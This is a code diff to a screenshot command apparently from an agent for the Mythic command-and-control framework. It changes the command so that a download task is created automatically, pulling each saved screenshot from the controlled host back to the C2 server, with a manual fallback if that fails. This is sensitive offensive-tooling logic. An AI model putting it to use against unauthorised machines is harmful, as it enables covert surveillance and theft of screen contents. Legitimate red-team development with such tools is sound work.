@@ -54,11 +54,31 @@ class ScreenshotCommand(CommandBase):
                             break
                     
                     if file_path:
-                        # Create a download task for the screenshot
-                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                            TaskID=task.Task.ID,
-                            Response=f"Screenshot saved to: {file_path}\n\nTo view the screenshot, use the download command:\ndownload {file_path}".encode()
-                        ))
+                        # Create a download task for the screenshot automatically
+                        try:
+                            # Create a new download task
+                            download_task = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
+                                TaskID=task.Task.ID,
+                                CommandName="download",
+                                Parameters=json.dumps({"file": file_path}),
+                                CallbackID=task.Callback.ID
+                            ))
+                            
+                            if download_task.Success:
+                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                                    TaskID=task.Task.ID,
+                                    Response=f"Screenshot saved to: {file_path}\n\nAutomatically creating download task to upload screenshot to Mythic...".encode()
+                                ))
+                            else:
+                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                                    TaskID=task.Task.ID,
+                                    Response=f"Screenshot saved to: {file_path}\n\nTo view the screenshot, use the download command:\ndownload {file_path}".encode()
+                                ))
+                        except Exception as e:
+                            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                                TaskID=task.Task.ID,
+                                Response=f"Screenshot saved to: {file_path}\n\nTo view the screenshot, use the download command:\ndownload {file_path}".encode()
+                            ))
                     else:
                         await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                             TaskID=task.Task.ID,
